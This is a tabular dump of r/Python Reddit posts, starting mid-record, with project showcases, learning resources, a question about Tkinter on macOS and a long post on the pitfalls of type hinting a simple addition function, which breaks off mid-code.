Instead of taking specific/clear arguments, these functions take some mysterious `params` dictionary with lord knows what in it. It's like they didn't even know what the function was going to do while they were writing it. How am I supposed to know what this function is doing? How am I supposed to write tests for this function? I've spent tens of hours of my life figuring out what is supposed to be in `params`, so that I can use or test these god-forsaken functions.

This is a friendly reminder that other people will probably have to read your code. Never name anything `params`, and definitely never define functions with ill-defined dictionaries as arguments.",https://www.reddit.com/r/Python/comments/jp0x4d/taking_a_dictionary_as_an_argument_is_the_root_of/,242,991
zvjfdy,Comprehensive Python Cheatsheet,,https://gto76.github.io/python-cheatsheet/,37,993
j5731h,A List of 100+ Random Python (beginner and advanced) Project Ideas,"Hey guys!

I know it's currently quarantine for most people, recruiting season for students/graduates, but also just a good time to keep up with coding and learning new things. I love projects because I think they're the best way to apply what you've learned and also create something relevant and functional to you. But we know that sometimes it's hard to get come up with ideas or it's just better to start small. Check out this list of more than a 100 Python projects that I compiled on topics such as web development, AI/ML, data science etc. to get inspired and start building!

[https://blog.thecodex.me/100-python-and-data-science-projects-for-every-kind-of-programmer/](https://blog.thecodex.me/100-python-and-data-science-projects-for-every-kind-of-programmer/)

A preview of ideas:

1. Mad Libs Creator
2. Sports Scores Tracker using Web Scraping
3. Random Password Generator
4. Mock Instagram Image Gallery
5.  Recipe (or anything else!) Database/ Manager
6. Movie/TV Show/Music/Book Recommenders with K-Means Clustering
7. Face Detection using Optical Character Recognition
8. Sentiment Analysis of Customer Feedback/Reviews
9. Image Caption Generator using CNN
10. Product Prices Estimates with ML
11. Nutrition/Fitness Tracker

P.S. If you do end up making one of these projects, let us know what you build and send a picture! We'll feature you on our project/coding tutorial Twitter account!

Thanks,

Avi",https://www.reddit.com/r/Python/comments/j5731h/a_list_of_100_random_python_beginner_and_advanced/,60,986
7zpn7y,Got some free time this weekend and want to build your Python and machine learning skills? Here's how to train your own object detector using Google's Python-based TensorFlow framework.,,https://www.youtube.com/watch?v=Rgpfk6eYxJA,33,992
zknjik,An attempt to significantly reduce homelessness and poverty: I made an open source web application that helps people who are struggling find social services and donators in their area that will help them.,"Link: https://stdepaul.org

It's called St. Vincent de Paul Assistance Center (named after St. De Paul because he is known for having dedicated his life to helping the poor). I had the idea for the project when I was trying to think of ways that web infrastructure can help cities build physical infrastructure. I started to think more broadly, and thought about how so many people in my community are struggling, and could be helped if they knew about social services in their area. I decided that St. De Paul can be a solution to this problem and other problems: to reduce homelessness, and to reduce poverty.

It is very much location-based, like craigslist (though people can get help from outside of their communities). Currently in the works: messaging, following, reviews, commenting. I just wanted to share the MVP so that people know St. De Paul is ready to help ASAP. (I had the idea for St. De Paul a week ago, and have been working on it ever since. I know it's a very quick MVP -- I'm using some code from some of my older personal projects.) I'm still debugging though, so you may run into some bugs.

Also, be prepared to wait for your post/wiki entry/helper org to be approved. I don't want people submitting inappropriate, or worse, illegal content, and then that be public on St. De Paul. I am posting this as I am about to fall asleep, so you likely won't see your posts in the search results until tomorrow, when I'll be able to approve your posts (but the links to whatever you create will be public, unless you delete it).

At the moment, only Dallas has wiki info on social services in the area (edit: there is now data for Texas, CA, and PA). The idea is that people can register and add information to the wiki for their area (categories: social services, free education that helps people develop skills for a better job (with testimonials), scholarships, etc). They get points for this, and there will be a ""Top Contributors in Your Area"" page that will encourage people to add information. People / organizations also get points for donating or providing services to people in their area (they also get points for donating or providing services outside of their area, but this gives fewer points). 100% of donations and services to people struggling go directly to those people. We will also be helping people apply for social services online, similar to TurboTax, so they won't have to worry about snail mail.

At the moment I'm looking for a corporate lawyer to help incorporate and to help with legal in general, as well as 

   1) empathetic and compassionate people who are great at running non-profits, and 

   2) a django developer more senior than me, to add to the board of directors at incorporation. I'm not sure how I'd handle donations directly to St. De Paul, except obviously website costs, payroll, and research on how to best serve poor people. If you are interested or know someone interested, please reach out (with your resume and linkedin)! Thanks

As far as contributors and moderators go, I'm looking for contributors who can: 

   1) add edit history to the wiki,

   2) help in writing tests and documentation, 

   3) add tree structure to comments (comments are almost done),  

   4) a mobile app 

   5) ""Top Contributors in your area"" (if I don't get to this before you all do). If you are interested, join the discord: https://discord.gg/krEyds6Cp2 -- and follow St. De Paul on Instagram: https://instagram.com/stdepaul

Source code: https://github.com/stdepaul/stdepaul

Thanks!

Michael

Here is my linkedin: https://linkedin.com/in/mikejohnsonjr

P.S. I think the portion in which we help people develop skills for a better job will be great in general. Someone I know personally went from working $10/hr to making $60k/year in a few months after taking a Data Analytics bootcamp, learning Excel and SQL. There are other paths as well.",https://www.reddit.com/r/Python/comments/zknjik/an_attempt_to_significantly_reduce_homelessness/,40,993
flu062,"Inspired on the Washington post article about COVID19 contain curve, I wrote some code emulating it. Comments are welcome.",,https://v.redd.it/3a75rrasjtn41,104,989
cb1gkd,Created a fun script to poorly replicate any image with Turtle,,https://v.redd.it/d0wkpmgoj7931,42,987
bscau7,"First upload here, graphic of a path finding algorithm using pygame. Been coding for about 8 months now, thought I'd like to show it off. :)",,https://v.redd.it/8rp3i1n603031,68,988
dx4gd7,"I created the Chaos game theory in python using only PyGame, random and the basics of algebra (I'm 14)",,https://v.redd.it/1cadwao1h0z31,191,984
h11dsi,A Tkinter Widget Templater/GUI Builder for Python (Linux/Mac),,https://i.redd.it/jb7ooq67sa451.png,61,984
o52ldp,Does anyone else dislike working with .ipynb files? Why can't I just define code cells with # %%,"I do EDA in Python and often use Jupyter Notebooks so I can see graphs in line with my code, but I hate that I can't use it with plain .py files and have to use a .ipynb which doesn't work well with Git, other IDEs, refactoring, etc. Other IDEs like PyCharm, VS Code and Spyder all have the ability to define labelled code cells in .py file with a line comment starting with `# %%`.

VS Code can individually execute code cells defined with `# %%` from a .py file and show results in IPython which is exactly what I want.. but the problem is that results are shown in a separate window not right below the cell, and rerunning the cell shows a new figure in IPython instead of replacing it.

[VS Code IPython code cells](https://preview.redd.it/756eei2z2o671.png?width=2221&format=png&auto=webp&s=5bdc2bf83cff04883d1ede624292c8308476193b)

Is there any way I can get Jupyter to work for `# %%` code cells in .py files, or get one of the other IDEs to show and update code cell results like Jupyter does right below the cell?",https://www.reddit.com/r/Python/comments/o52ldp/does_anyone_else_dislike_working_with_ipynb_files/,60,981
lb08fj,"Full Course - Financial Data Analysis with Python - Part 1 of 8 - Technical Analysis with DataFrames - Use DataFrames to load historical stock price data, Similarities with DataFrames and Excel, Learn about loc and iloc on DataFrames",,https://youtu.be/m8ahf_c9hEc,40,985
eyigdc,Interactive Coronavirus Spreading Map in Python,,https://i.redd.it/8z9urw8fete41.gif,71,981
q2rpmp,Tkinter for python 3.10 broken on MacOS?,"Hello, I read on the internet that there are some problems with Tkinter on laster MacOS updates like buttons invisible, UI bugs...Since I had some problems too recently, do you know anything about this situation?

EDIT : Solved! There is a package studied from Mac that extends tkinter and solves many problems.
Take a look at my GitHub’s issue, there are all steps to solve the problem and install the package( tkmacosx) :

https://github.com/Saadmairaj/tkmacosx/issues/33",https://www.reddit.com/r/Python/comments/q2rpmp/tkinter_for_python_310_broken_on_macos/,44,974
oxoldd,"I was hired partly because of my knowledge of python, but head of IT won’t let me install it…","Less of a question more of a smh kind of rant. I was picked up for an ‘entry’ level job in the winter, which I enjoy. I was given the job partly because of my (limited) coding experience, I kind of thought it would be a good place to use code ‘for the boring stuff’ and improve, and maybe use python on some of the project work. I wasn’t hired as a developer or anything but there have been times where python would have been great to use. I’ve needed to source and rename thousands of images for example for an online catalog, I could have done that in minutes with python but instead had to use excel and a convoluted VBA script… 

I’m now at the point where we’d like to design a system wherein our designers can input product data onto a program that generates the excel code or a product data file, but will automatically check for mistakes and standardise phrasing to avoid errors that have until now, been pretty common. Python seems like a nice candidate for this but I’m kind of stuck with Excel at the moment… 

Are there security concerns with python in businesses?

EDIT: thanks for all the responses guys, I’m not exactly looking for a solution to this however. I know other alternatives exist to get these jobs done, I just think it’s funny so much of my interview was excitement over python and then being told almost immediately after starting I couldn’t use it.",https://www.reddit.com/r/Python/comments/oxoldd/i_was_hired_partly_because_of_my_knowledge_of/,340,982
b1h8za,Coding in python sometimes feels like writing a really weird tongue twister...,,https://i.redd.it/ixl0cj0tbbm21.gif,165,975
jyi8ku,Better Python console apps with Rich,,https://jslvtr.com/posts/better-python-console-apps-with-rich,28,978
vd6yt2,i mapped the whole C standard library to python,"might be a bit buggy right now, but here's a quick example:
```py
from pointers import fopen, fclose, fprintf # this is all type safe and cross platform as well

file = fopen('/dev/null', 'w')
fprintf(file, ""hello"")
fclose(file)
```

repo: https://github.com/ZeroIntensity/pointers.py",https://www.reddit.com/r/Python/comments/vd6yt2/i_mapped_the_whole_c_standard_library_to_python/,94,968
mk04fg,A horrifying single line neural network using NumPy,"    import numpy as u;X=u.array([[0,0],[0,1],[1,0],[1,1]]);y=u.array([[0],[1],[1],[0]]);nn={'input':X,'w1':u.random.rand(X.shape[1],4),'w2':u.random.rand(4,1),'y':y,'o':u.zeros(y.shape)};s=lambda x:x*(1.-x);[(nn.update({'l1':1./(1+u.exp(-u.dot(nn['input'],nn['w1']))),}),nn.update({'o':1./(1+u.exp(-u.dot(nn['l1'],nn['w2'])))}),nn.update({'w1':nn['w1']+u.dot(nn['input'].T,(u.dot(2*(nn['y']-nn['o'])*s(nn['o']),nn['w2'].T)*s(nn['l1']))),'w2':nn['w2']+u.dot(nn['l1'].T,(2*(nn['y']-nn['o'])*s(nn['o'])))})) for i in range(1500)];print(nn['o'])

I followed a [tutorial](https://towardsdatascience.com/how-to-build-your-own-neural-network-from-scratch-in-python-68998a08e4f6) a while back for the original, and today I wanted to break every rule in PEP-8 and try and compact it into a single line. I still think this could be compacted further and would be interesting to try and make it without numpy!

The example data is a XOR truth table.

Here is its output:

    [[0.07890343]
     [0.9348799 ]
     [0.93513069]
     [0.05581925]]

Even with a three-argument table:

    [[0.95127264]
     [0.02120538]
     [0.01250151]
     [0.02080481]
     [0.02143134]
     [0.00877311]
     [0.02076787]
     [0.9776844 ]]

[Here is a link to the slightly expanded version.](https://github.com/sphynxy/hell/blob/ba6086e160183f8e4af2f8872d23ff59c7b3e519/maching-learning-expanded.py)

Edit: added original tutorial link",https://www.reddit.com/r/Python/comments/mk04fg/a_horrifying_single_line_neural_network_using/,87,972
k62xlu,"Using Python and Spotify Web API, you can make an ""endless"" playlist based of the Rolling Stone Magazine's top 500 albums of all time",,https://blog.seekwell.io/endless-spotify-playlist,44,965
5yqgc3,I accidentally deleted some Python source code but it was still resident in a running process - here's how I got it back,,https://gist.github.com/simonw/8aa492e59265c1a021f5c5618f9e6b12,97,963
mikh28,Send SMS Text Message With Python Using GMail SMTP For Free,"Video: [https://youtu.be/hKxtMaa2hwQ](https://youtu.be/hKxtMaa2hwQ)

Source: [https://github.com/acamso/demos/blob/master/\_email/send\_txt\_msg.py](https://github.com/acamso/demos/blob/master/_email/send_txt_msg.py)

This  is a demonstration on how to send a text message with Python. In  this  example, we use GMail to send the SMS message; but any host can  work  with the correct SMTP settings.",https://www.reddit.com/r/Python/comments/mikh28/send_sms_text_message_with_python_using_gmail/,88,971
kfwx2l,[Project] carefree-learn: Tabular Datasets ❤️ PyTorch,"> [GitHub](https://github.com/carefree0910/carefree-learn)
> 
> [Documentation](https://carefree0910.me/carefree-learn-doc/)
> 
> [PyTorch Official Medium Post](https://medium.com/pytorch/carefree-learn-tabular-datasets-%EF%B8%8F-pytorch-e329b2f008f2)

You like PyTorch? You like scikit-learn? Then you'll like carefree-learn!

Enjoy training neural networks on tabular datasets with one line of code:

```python
import cflearn

m = cflearn.make().fit(x, y)
```",https://www.reddit.com/r/Python/comments/kfwx2l/project_carefreelearn_tabular_datasets_pytorch/,6,965
f6tjds,I have been learning python as my first language for a few months now and I finally made a project I think is fun and proud enough of to show off.,,https://v.redd.it/4oq69hnp53i41,91,972
iy48av,I had tried to visualise the sorting of a data structure for the programmers who are new in data structure,,https://v.redd.it/4zow9alp1uo51,45,964
frtg22,Real Python is giving away lifetime access to some of their paid courses for free. Great way to utilize time while in quarantine.,,https://www.aabhusanaryal.com.np/2020/03/free-realpython-courses.html/,22,960
eecd17,Python tool to turn images into sound by creating a sound whose spectrogram looks like the image. Motivated by DOOM hiding satanic symbols in its soundtrack. [OC],,https://gfycat.com/belovedharmfulkudu,45,956
eke4jy,I like how simple python + pygame is. Less than 60 minutes of playing around with it and I can jump around. The code is a bit messed up...,,https://i.redd.it/auadleqs6z841.gif,57,958
agy027,Python is becoming the world’s most popular coding language,,https://www.economist.com/graphic-detail/2018/07/26/python-is-becoming-the-worlds-most-popular-coding-language,222,954
ikliwj,Web Scraping 1010 with Python,,https://www.scrapingbee.com/blog/web-scraping-101-with-python/,102,952
9tckvc,"I made a dice roller in python. It isn’t much, but it was fun to make :)",,https://v.redd.it/ifd4aoqosrv11,91,951
nstf0t,"I learnt to use ASTs to patch 100,000s lines of python code"," I had to patch 100,000s of lines of code across 10 systems. So, I used Abstract Syntax Trees to write auto-patch scripts and in the process learnt how powerful ASTs are. I have explained what I did and my learning in the attached article. Hope this helps some of you folks out there.

[https://engineering.soroco.com/abstract-syntax-tree-for-patching-code-and-assessing-code-quality/](https://engineering.soroco.com/abstract-syntax-tree-for-patching-code-and-assessing-code-quality/)",https://www.reddit.com/r/Python/comments/nstf0t/i_learnt_to_use_asts_to_patch_100000s_lines_of/,88,957
eslbmr,"I see your minesweeper, but how about minesweeper for your terminal? Link to code in the comments.",,https://i.redd.it/k69v8szdefc41.gif,30,946
928hd9,Python is becoming the world’s most popular coding language,,https://www.economist.com/graphic-detail/2018/07/26/python-is-becoming-the-worlds-most-popular-coding-language,183,950
lkwjuq,Java programmer coming to Python for the first time...,"Decided to try and do a thing in Python for the first time in a while.

Wrote a small program to test out a library in Python that I'd originally been using the Java version of.

Keep in mind I'm very, VERY used to Java and to an extent C++.

Take a guess as to what happened.

&#x200B;

It ran flawlessly with zero errors the first time I ran it.

&#x200B;

Why the hell don't I use this friggin language more often.

I'm genuinely still astonished, not a single thing I've made in Java has run flawlessly the first time I run it.

So uh, hello Python. Where the hell have you been all this time?",https://www.reddit.com/r/Python/comments/lkwjuq/java_programmer_coming_to_python_for_the_first/,219,949
dhftb0,Made a genetic algorithm with the task of recreating an image using triangles. Used the pillow library for the image work and the rest was just math :),,https://i.redd.it/r4x8wl7h8ds31.png,80,947
7a0qe0,boo.py,,https://imgur.com/EjCwNNG,20,949
8o9k0s,The Google reCaptcha solver bot that I made in action.,,https://youtu.be/YzjsXqnAO8w,100,940
lx4tmd,"""Automate the Boring Stuff with Python"" online course is free to sign up for the next few days with code MAR2021FREE","https://inventwithpython.com/automateudemy (This link will automatically redirect you to the latest discount code.)

You can also click this link or manually enter the code: MAR2021FREE

https://www.udemy.com/course/automate/?couponCode=MAR2021FREE

This promo code works until the 4th (I can't extend it past that). Sometimes it takes an hour or so for the code to become active just after I create it, so if it doesn't work, go ahead and try again a while later. I'll change it to MAR2021FREE2 in three days.

Udemy has changed their coupon policies, and I'm now only allowed to make 3 coupon codes each month with several restrictions. Hence why each code only lasts 3 days. **I won't be able to make codes after this period**, but I will be making free codes next month. [Meanwhile, the first 15 of the course's 50 videos are free on YouTube.](https://www.youtube.com/watch?v=1F_OgqRuSdI&list=PL0-84-yl1fUnRuXGFe_F7qSH1LEnn9LkW)

You can also purchase the course at a discount using my code JAN2021CODE or FEB2021CODE (try both if one doesn't work) or clicking https://inventwithpython.com/automateudemy to redirect to the latest discount code. I have to manually renew this each month (until I get that automation script done). And the cheapest I can offer the course is about $16 to $18. (Meanwhile, this lets Udemy undercut my discount by offering it for $12, and I don't get the credit for those referral signups. Blerg.)

**Frequently Asked Questions:** (*read this before posting questions*)

* This course is for beginners and assumes no previous programming experience, but the second half is useful for experienced programmers who want to learn about various third-party Python modules.
* If you don't have time to take the course now, that's fine. Signing up gives you lifetime access so you can work on it at your own pace.
* This Udemy course covers roughly the same content as the 1st edition book (the book has a little bit more, but all the basics are covered in the online course), which you can read for free online at https://inventwithpython.com
* The 2nd edition of Automate the Boring Stuff with Python is free online: https://automatetheboringstuff.com/2e/
* I do plan on updating the Udemy course for the second edition, but it'll take a while because I have other book projects I'm working on. Expect that update to happen in mid-2021. If you sign up for this Udemy course, you'll get the updated content automatically once I finish it. It won't be a separate course.
* It's totally fine to start on the first edition and then read the second edition later. I'll be writing a blog post to guide first edition readers to the parts of the second edition they should read.
* I wrote a blog post to cover [what's new in the second edition](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)
* **You're not too old to learn to code. You don't need to be ""good at math"" to be good at coding.**
* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with. Check out /r/ProgrammingBuddies",https://www.reddit.com/r/Python/comments/lx4tmd/automate_the_boring_stuff_with_python_online/,39,941
giuxez,Trained an deep learning model to recognize hand written numbers then made a small GUI to enter my own numbers on the screen,,https://v.redd.it/pikc45c8shy41,49,942
x9cf74,Don’t laugh at me! Like this is completely not my lane. I’m from the hood.,"But I’m super happy that I figured out a piece of code and it’s working! Coded a selenium Instagram Unfollow bot. All the code I found and tutorials didn’t work. I literally had to google find a piece of code that worked then 10 other pieces that didn’t work and kinda piece it together until the shit just worked and I’m happy bro. The funny thing is, I still don’t know wtf I’m doing 😂 I hope I’m able to get better tho… I put it to unfollow every 60 seconds so hopefully I don’t get banned…",https://www.reddit.com/r/Python/comments/x9cf74/dont_laugh_at_me_like_this_is_completely_not_my/,114,938
ntew6a,So I like to eat and I like to code but I dont like full priced items - I built a tool to find all sales at various groceries every day so I know how to plan my meals! Take a look - its open source!,"Edit: some people have reached out to fork/explore the repo - I would love to let it be known that I would love to work with anyone who wants to embark on the integration journey with me - always open to suggestions/code contributions/etc. Just reach out!!!!

Hi everyone, been a long time lurker here inspired by the resourcefulness and commitment of people on this subreddit to finding clever ways to pinch every penny.

tldr: I code a ton and I made one of my programs accessible on the web so people can see Whole Foods sale items near them with less hassle! [Access the tool here](https://wholey-frugal.herokuapp.com): [https://wholey-frugal.herokuapp.com](https://wholey-frugal.herokuapp.com/) and if interested I am happy to share any and all code!

I have worked on many web scraping/coding projects for fun in the past so last year I wrote a bit of code to find all sale items at all the Whole Foods near me and then yield a list with the items (alongside with the store name with the sale closest to me). I then decided that I wanted to share what I made with you all in case it even helps one person - this is a personal project, no ads, nothing of the sort.

Just type in your ZIP Code (eg. 38103), City + State Abbreviation (eg. Memphis TN), or address and it will do all the work - I plan to work out a couple more hiccups in the code later today but for the most part it works for decently sized cities

&#x200B;

https://preview.redd.it/51zor53g4l371.png?width=2282&format=png&auto=webp&s=d09c9ad12248192eec0b559affe1b29deee8510f

&#x200B;

https://preview.redd.it/bkf2l55h4l371.png?width=1458&format=png&auto=webp&s=896c01f500c76f87e3b294219cadd3f9652723fc

You can find the project here: [https://wholey-frugal.herokuapp.com](https://wholey-frugal.herokuapp.com) and I would love any and all suggestions for other projects/thoughts on this one!! (I am working on a recipe list to match all sale items just because why not!!)

Open source here: [https://github.com/ws2516/WholeFoodsFrugality](https://github.com/ws2516/WholeFoodsFrugality)",https://www.reddit.com/r/Python/comments/ntew6a/so_i_like_to_eat_and_i_like_to_code_but_i_dont/,86,938
ex4fwo,Is it possible to do this with Python?,,https://i.redd.it/gi81b30yhqd41.png,72,936
cua7xr,Recoding flappy bird in python with pygame,,https://v.redd.it/t5de1quzb5i31,80,936
b1b23t,I’m really proud of a basic chat system I made!,,https://i.redd.it/psotvkqf08m21.jpg,95,936
sg3owy,"What're the cleanest, most beautifully written projects in Github that are worth studying the code?",,https://www.reddit.com/r/Python/comments/sg3owy/whatre_the_cleanest_most_beautifully_written/,145,931
10zdidm,Why Type Hinting Sucks!,"Type hints are great! But I was [playing Devil's advocate](https://www.reddit.com/r/Python/comments/10vh1v5/mypy_10_released/j7igi8q/?context=3) on a thread recently where I claimed actually type hinting can be legitimately annoying, especially to old school Python programmers.

But I think a lot of people were skeptical, so let's go through a made up scenario trying to type hint a simple Python package. Go to the end for a TL;DR.

# The scenario 

This is completely made up, all the events are fictitious unless explicitly stated otherwise (also editing this I realized attempts 4-6 have even more mistakes in them than intended but I'm not rewriting this again):

**You** maintain a popular third party library `slowadd`, your library has many supporting functions, decorators, classes, and metaclasses, but your main function is:

    def slow_add(a, b):
        time.sleep(0.1)
        return a + b

You've always used traditional Python duck typing, if a and b don't add then the function throws an exception. But you just dropped support for Python 2 and your users are demanding type hinting, so it's your next major milestone.

# First attempt at type hinting

You update your function:

    def slow_add(a: int, b: int) -> int:
        time.sleep(0.1)
        return a + b

All your tests pass, mypy passes against your personal code base, so you ship with the release note ""Type Hinting Support added!""

# Second attempt at type hinting

Users immediately flood your GitHub issues with complaints! MyPy is now failing for them because they pass floats to `slow_add`, build processes are broken, they can't downgrade because of internal Enterprise policies of always having to increase type hint coverage, their weekend is ruined from this issue.

You do some investigating and find that MyPy supports [Duck type compatibility](https://mypy.readthedocs.io/en/latest/duck_type_compatibility.html) for `ints -> floats -> complex`. That's cool! New release:

    def slow_add(a: complex, b: complex) -> complex:
        time.sleep(0.1)
        return a + b

Funny that this is a MyPy note and not a PEP standard...

# Third attempt at type hinting

Your users thank you for your quick release, but a couple of days later one user asks why you no longer support `Decimal`. You replace `complex` with `Decimal` but now your other MyPy tests are failing.

You remember Python 3 added [Numeric abstract base classes](https://docs.python.org/3/library/numbers.html), what a perfect use case, just type hint everything as `numbers.Number`.

Hmmm, MyPy doesn't consider any of integers, or floats, or Decimals to be numbers :(.

After reading through [typing](https://docs.python.org/3/library/typing.html) you guess you'll just `Union` in the Decimals:

    def slow_add(
        a: Union[complex, Decimal], b: Union[complex, Decimal]
    ) -> Union[complex, Decimal]:
        time.sleep(0.1)
        return a + b

Oh no! MyPy is complaining that you can't add your other number types to Decimals, well that wasn't your intention anyway...

More reading later and you try overload:

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    def slow_add(a, b):
        time.sleep(0.1)
        return a + b

But MyPy on strict is complaining that `slow_add` is missing a type annotation, after reading [this issue](https://github.com/python/mypy/issues/3360) you realize that `@overload` is only useful for users of your function but the body of your function will not be tested using `@overload`. Fortunately in the discussion on that issue there is an alternative example of how to implement:


    T = TypeVar(""T"", Decimal, complex)

    def slow_add(a: T, b: T) -> T:
        time.sleep(0.1)
        return a + b

# Fourth attempt at type hinting

You make a new release, and a few days later more users start complaining. A very passionate user explains the super critical use case of adding tuples, e.g. `slow_add((1, ), (2, ))`

You don't want to start adding each type one by one, there must be a better way! You learn about Protocols, and Type Variables, and positional only parameters, *phew*, this is a lot but this should be perfect now:


    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    def slow_add(a: Addable, b: Addable) -> Addable:
        time.sleep(0.1)
        return a + b


# A mild diversion

You make a new release noting ""now supports any addable type"".

Immediately the tuple user complains again and says type hints don't work for longer Tuples: `slow_add((1, 2), (3, 4))`. That's weird because you tested multiple lengths of Tuples and MyPy was happy.

After debugging the users environment, via a series of ""back and forth""s over GitHub issues, you discover that pyright is throwing this as an error but MyPy is not (even in strict mode). You **assume** MyPy is correct and move on in bliss ignoring there is actually a fundamental mistake in your approach so far.

(**Author Side Note** - It's not clear [if MyPy is wrong](https://github.com/python/mypy/issues/14679) but it defiantly makes sense for Pyright to throw an error here, I've filed issues against both projects and a pyright maintainer has [explained the gory details](https://github.com/microsoft/pyright/issues/4613/) if you're interested. Unfortunately this was not really addressed in this story until the ""Seventh attempt"")


# Fifth attempt at type hinting

A week later a user files an issue, the most recent release said that ""now supports any addable type"" but they have a bunch of classes that can *only* be implemented using `__radd__` and the new release throws typing errors.

You try a few approaches and find this seems to best solve it:

    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    class RAddable(Protocol):
        def __radd__(self: T, other: Any, /) -> T:
            ...

    @overload
    def slow_add(a: Addable, b: Addable) -> Addable:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> RAddable:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b

Annoyingly there is now no consistent way for MyPy to do anything with the body of the function. Also you weren't able to fully express that when b is ""RAddable"" that ""a"" should not be the same type because Python type annotations don't yet support being able to exclude types.

# Sixth attempt at type hinting

A couple of days later a new user complains they are getting type hint errors when trying to raise the output to a power, e.g. `pow(slow_add(1, 1), slow_add(1, 1))`. Actually this one isn't too bad, you quick realize the problem is your annotating Protocols, but really you need to be annotating Type Variables, easy fix:

    T = TypeVar(""T"")

    class Addable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    A = TypeVar(""A"", bound=Addable)

    class RAddable(Protocol):
        def __radd__(self: T, other: Any, /) -> T:
            ...

    R = TypeVar(""R"", bound=RAddable)

    @overload
    def slow_add(a: A, b: A) -> A:
        ...

    @overload
    def slow_add(a: Any, b: R) -> R:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# Seventh attempt at type hinting

Tuple user returns! He says MyPy in strict mode is now complaining with the expression `slow_add((1,), (2,)) == (1, 2)` giving the error:

> Non-overlapping equality check (left operand type: ""Tuple[int]"", right operand type: ""Tuple[int, int]"")

You realize you can't actually guarantee anything about the return type from some arbitrary `__add__` or `__radd__`, so you starting throwing `Any` Liberally around:

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# Eighth attempt at type hinting

Users go crazy! The nice autosuggestions their IDE provided them in the previous release have all gone! Well you can't type hint the world, but I guess you could include type hints for the built-in types and *maybe* some Standard Library types like Decimal:

You think you can rely on some of that MyPy duck typing but you test:

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

And realize that MyPy throws an error on something like `slow_add(1, 1.0).as_integer_ratio()`. So much for that nice duck typing article on MyPy you read earlier.

So you end up implementing:

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: int, b: int) -> int:
        ...

    @overload
    def slow_add(a: float, b: float) -> float:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    @overload
    def slow_add(a: str, b: str) -> str:
        ...

    @overload
    def slow_add(a: tuple[Any, ...], b: tuple[Any, ...]) -> tuple[Any, ...]:
        ...

    @overload
    def slow_add(a: list[Any], b: list[Any]) -> list[Any]:
        ...

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: Fraction, b: Fraction) -> Fraction:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b

As discussed earlier MyPy doesn't use the signature of any of the overloads and compares them to the body of the function, so all these type hints have to manually validated as accurate by you.

# Ninth attempt at type hinting

A few months later a user says they are using an embedded version of Python and it hasn't implemented the Decimal module, they don't understand why your package is even importing it given it doesn't use it. So finally your code looks like:

    from __future__ import annotations

    import time
    from typing import TYPE_CHECKING, Any, Protocol, TypeVar, overload

    if TYPE_CHECKING:
        from decimal import Decimal
        from fractions import Fraction


    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class RAddable(Protocol):
        def __radd__(self: ""RAddable"", other: Any, /) -> Any:
            ...

    @overload
    def slow_add(a: int, b: int) -> int:
        ...

    @overload
    def slow_add(a: float, b: float) -> float:
        ...

    @overload
    def slow_add(a: complex, b: complex) -> complex:
        ...

    @overload
    def slow_add(a: str, b: str) -> str:
        ...

    @overload
    def slow_add(a: tuple[Any, ...], b: tuple[Any, ...]) -> tuple[Any, ...]:
        ...

    @overload
    def slow_add(a: list[Any], b: list[Any]) -> list[Any]:
        ...

    @overload
    def slow_add(a: Decimal, b: Decimal) -> Decimal:
        ...

    @overload
    def slow_add(a: Fraction, b: Fraction) -> Fraction:
        ...

    @overload
    def slow_add(a: Addable, b: Any) -> Any:
        ...

    @overload
    def slow_add(a: Any, b: RAddable) -> Any:
        ...

    def slow_add(a: Any, b: Any) -> Any:
        time.sleep(0.1)
        return a + b


# TL;DR

Turning even the simplest function that relied on Duck Typing into a Type Hinted function that is useful can be painfully difficult.

Please always put on your empathetic hat first when asking someone to update their code to how you think it should work.

In writing up this post I learnt a lot about type hinting, please try and find edge cases where my type hints are wrong or could be improved, it's a good exercise.

**Edit:** Had to fix a broken link.

**Edit 2:** It was late last night and I gave up on fixing everything, some smart people nicely spotted the errors!

I have a ""tenth attempt"" to address these error. But pyright complains about it because my overloads overlap, however I don't think there's a way to express what I want in Python annotations without overlap. Also Mypy complains about some of the user code I posted earlier giving the error [comparison-overlap](https://mypy.readthedocs.io/en/stable/error_code_list2.html#check-that-comparisons-are-overlapping-comparison-overlap), interestingly though pyright seems to be able to detect here that the types don't overlap in the user code.

I'm going to file issues on pyright and mypy, but fundamentally they might be design choices rather than strictly bugs and therefore a limit on the current state of Python Type Hinting:

    T = TypeVar(""T"")

    class SameAddable(Protocol):
        def __add__(self: T, other: T, /) -> T:
            ...

    class Addable(Protocol):
        def __add__(self: ""Addable"", other: Any, /) -> Any:
            ...

    class SameRAddable(Protocol):
